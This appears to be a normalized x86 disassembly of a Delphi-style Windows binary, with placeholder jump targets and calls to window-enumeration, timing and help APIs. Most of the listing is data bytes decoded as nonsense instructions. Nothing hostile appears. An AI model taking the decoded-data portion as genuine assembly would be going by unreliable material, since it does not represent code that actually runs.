push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_4383d0
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438469
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407bc4
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_438478
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_438494
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_4383d0
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_438474
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_438478
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_4384f0
sub_4384f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43856d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_437f50
call GetTickCount
mov ebx eax
push 0x0
call sub_40614c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_437b50
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438574
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43857c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403590
call sub_405640
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4385c4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4385f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43865e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438665
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405628
mov eax rw-data
call sub_405628
mov eax rw-data
call sub_405628
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_405628
mov eax [ rw-data ]
call sub_437c20
sub_438668
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4386ba
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4386c1
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43857c
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405628
mov edx eax
mov eax [ rw-data ]
call sub_4247f8
sub_4386c4
enter 0x4386 0x0
add [ esp + edx * 2 ] ecx
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
push eax
mov ah 0x43
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ eax - 0x37ffbc4c ] ah
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 8 - 0x79 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax - 0x79 ] si
inc ebx
add ah dh
adc [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
nop
in al 0x86
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc eax
add [ eax + 0x4387 ] ah
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add [ eax - 0x5fffbc4c ] dh
mov ah 0x43
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les eax [ edi + 0x340043 ]
jae r-xdata
add [ ecx + ecx * 4 ] dh
inc esp
jb r-xdata
add [ eax - 0x4c ] dl
inc ebx
add [ eax ] dl
mov ch 0x43
add al al
mov ah 0x43
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
xchg [ ebx ] eax
xor al 0x0
jb r-xdata
inc ebx
add [ eax + 0x2c0043b5 ] cl
mov bl 0x43
add ah ah
mov ah 0x43
add al dh
mov dl 0x43
add [ ebp + esi * 4 - 0x4bb7ffbd ] dl
inc ebx
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
clc
xchg [ ebx ] eax
mov ah 0x34
inc eax
add [ eax - 0x5fffbc4c ] dh
add [ eax ] al
xor al 0x89
inc ebx
outsd
outsb
je r-xdata
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
cmp al 0xb5
inc ebx
add [ esp + esi * 4 ] ch
inc ebx
add [ eax ] ch
mov ah 0x43
add [ ebx + esi * 4 ] ch
inc ebx
add ah ah
mov ah 0x43
add al dh
mov dl 0x43
add [ esp + esi * 4 + 0x43 ] al
add [ eax - 0x4c ] cl
inc ebx
add [ ebx + 0x438844c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x78 ] dh
inc ebx
add [ eax + eax ] bh
add [ eax ] al
push esp
xchg [ ebx ] eax
mov ah 0x34
inc eax
add [ eax - 0x5fffbc4c ] dh
mov ah 0x43
add al cl
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
cld
xchg [ ebx ] al
add eax [ esi ]
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add al bh
xchg [ ebx ] al
push es
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ edi + esi * 4 - 0x4bd7ffbd ] dh
inc ebx
inc ebx
outsd
outsb
je r-xdata
add [ ebp + esi * 4 - 0x4aefffbd ] dh
inc ebx
add al al
mov ah 0x43
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
mov ah 0x43
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x6c ] si
mov [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ecx + r--data ] 0x0
add [ eax + ecx * 4 + 0x34b40043 ] bh
inc eax
add [ eax - 0x2bffbc4c ] dh
mov ch 0x43
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
cmp al 0xb5
inc ebx
add [ eax - 0x4b ] dh
mov ah 0x43
add al cl
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x74 ] si
mov [ ebx ] al
pop es
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
add [ esp + esi - 0x4b4fffc0 ] dh
inc ebx
add al cl
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x76 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x76 ] si
inc ebx
add [ eax + 0x4388 ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x4c ] cl
inc ebx
add [ eax - 0x4c ] dl
inc ebx
add al cl
mov dh 0x43
add al bl
mov ch 0x43
add [ eax ] dl
mov bh 0x43
add [ edi + esi * 4 - 0x485fffbd ] cl
inc ebx
add al al
mov bh 0x43
add [ edi ] cl
push esp
inc esp
jb r-xdata
mov ah 0x43
add [ ebx + esi * 4 ] ch
inc ebx
add [ esi + esi * 4 + 0x43 ] ch
add al dh
mov dl 0x43
add [ esp + esi * 4 + 0x43 ] al
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
and al 0x8a
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x76 ] ah
inc ebx
add [ eax ] dh
add [ eax ] al
clc
xchg [ ebx ] eax
mov ah 0x34
inc eax
add [ eax - 0x5fffbc4c ] dh
mov ah 0x43
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
cmp al 0xb6
inc ebx
add [ esi * 4 - 0x484bffbd ] bh
inc ebx
add [ eax ] ch
mov ah 0x43
inc ebx
add [ eax + 0x2c0043b5 ] cl
mov bl 0x43
add ah ah
mov ah 0x43
add al dh
mov dl 0x43
add [ ebp + esi * 4 - 0x4bb7ffbd ] dl
mov esp 0x4004034
xor al [ eax ]
and [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi * 4 - 0x4a8fffbd ] bh
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor al [ eax ]
pop esp
xor al [ eax ]
call 0x2c43cb57
mov ah 0x43
add [ eax ] ch
mov ah 0x43
add [ ebx + esi * 4 ] ch
inc ebx
add [ eax - 0xfffbc4e ] dl
mov dl 0x43
outsd
insd
inc ecx
add [ edi + edi - 0x287bffbf ] al
inc ecx
add [ eax - 0x29 ] dh
inc ecx
add ah al
leave
inc ebx
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
test [ ebx + 0x43 ] cl
add [ eax - 0x4c ] dl
inc ebx
add al cl
mov dh 0x43
add al bl
mov ch 0x43
add [ eax ] dl
mov bh 0x43
add [ edi + esi * 4 - 0x485fffbd ] cl
inc ebx
add al al
mov bh 0x43
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
cmp al 0xb5
inc ebx
add [ eax - 0x4b ] dh
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x4c ] cl
inc ebx
add [ eax - 0x4c ] dl
inc ebx
inc esp
mov ah 0x43
je r-xdata
xor al 0x40
add [ edx + esi ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
mov bh 0x43
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
cmp al 0xb6
inc ebx
add [ esi * 4 - 0x484bffbd ] bh
inc ebx
add [ eax ] ch
mov ah 0x43
add [ ebx + esi * 4 ] ch
inc ebx
add [ esi + esi * 4 + 0x43 ] ch
add al dh
mov dl 0x43
add [ esp + esi * 4 + 0x43 ] al
add [ eax - 0x4c ] cl
inc ebx
add [ ebx + 0x438ae8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 ] ah
inc ebx
add [ eax ] dh
add [ eax ] al
fmul [ ecx + 0x34b40043 ]
inc eax
add [ eax - 0x37ffbc4c ] dh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 - 0x78 ] si
inc ebx
add al dl
xchg [ ebx ] eax
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ esp + esi * 4 + 0x43 ] al
inc ebx
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
inc eax
add [ eax ] ah
xor al [ eax ]
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
jae r-xdata
inc ebx
add [ ebp + esi * 4 - 0x4aefffbd ] dh
inc ebx
add al al
mov ah 0x43
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x8b
inc ebx
add [ eax ] al
add [ eax ] al
mov al 0x8b
inc ebx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp - 0x76f7ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] ch
into
inc ebx
add [ esp + ebx * 4 + 0x41 ] al
add ah dl
into
inc ebx
add [ ebx + ebx * 4 - 0x63d7ffbf ] dl
inc ecx
add [ esp + ebx * 4 + 0x41 ] bh
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
fcomp [ ebx - 0x33f7ffbf ]
inc ebx
add [ eax ] dl
pushfd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 + 0x640043 ] bl
add [ eax ] al
mov cl 0x41
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
cwde
leave
inc ebx
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
add [ eax ] al
add [ eax + 0x438b ] dh
mov eax [ ebx ]
shl [ ecx + 0x40041 ] 0x1
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx * 8 - 0x5adbffbd ] dl
inc esp
add [ eax + 0x4c0043cd ] cl
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x5b ] ah
inc esp
add [ eax ] al
iretd
inc ecx
outsd
insb
jae r-xdata
add [ ebp - 0x73dbffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c00438c ] ah
add [ eax ] al
add [ esi + ebx * 4 ] bh
inc esp
add [ esp + esi + 0x34c00040 ] dh
inc eax
sub_438e65
mov es [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x8e
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax + 0x17 ] dh
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop eax
aas
inc ecx
add [ eax ] ah

sub_438ec9
mov es [ ebx ]
pop es
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
xor al 0x8e
inc ebx
add [ eax ] dl
add [ eax ] al
[ eax - 0x35 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x438e3474
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
mov es [ ebx ]
adc [ eax ] al
add bh bh
push 0x10043cb
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
imul ebp [ esi + 0x74 ] 0x438ea073
add ah ah
pop ss
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x439000c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
add bh bh
push 0x10043cb
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
mov [ edi + 0xb080043 ] cl
push esp
dec ebp
outsd
jne r-xdata
mov es [ ebx ]
adc al 0x0
add [ eax + eax ] dl
inc ebx
outsd
insb
jae r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ eax ] cl
add [ eax ] al
[ eax - 0x35 ]
add [ esi + ecx * 4 ] dh
inc ebx
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add ah dh
adc [ eax ] al
push 0x58004010
adc [ ecx ] al
nop
mov al 0x90
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
inc ebx
add [ eax ] cl
push cs
push esp
dec ebx
jns r-xdata
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc ebp
jbe r-xdata
hlt
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
inc esp
jb r-xdata
jbe r-xdata
hlt
add al dl
xchg [ ebx ] eax
sbb al 0x92
jb r-xdata
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] dh
lea eax [ ebx ]
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
inc esp
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
hlt
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp - 0x6f13ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x6e2bffc0 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
pop es
dec ecx
outsb
je r-xdata
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
jb r-xdata
jb r-xdata
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax - 0x6e ] bh
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
rol [ edi - 0x6de3ffbd ] 0x1
push ebx
outsb
add al 0x8
push es
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] ch
xchg esp eax
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jbe r-xdata
inc ebp
or [ ecx ] dl
push esp
inc edi
je r-xdata
outsd
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
hlt
outsb
je r-xdata
add ah dh
adc [ eax ] al
enter 0x4399 0x0
mov al [ 0x43a1 ]
adc [ eax ] al
fcom [ ebx + 0xf080043 ]
push esp
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc ebx
jpe r-xdata
enter 0x4399 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4394b4c0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
jo r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
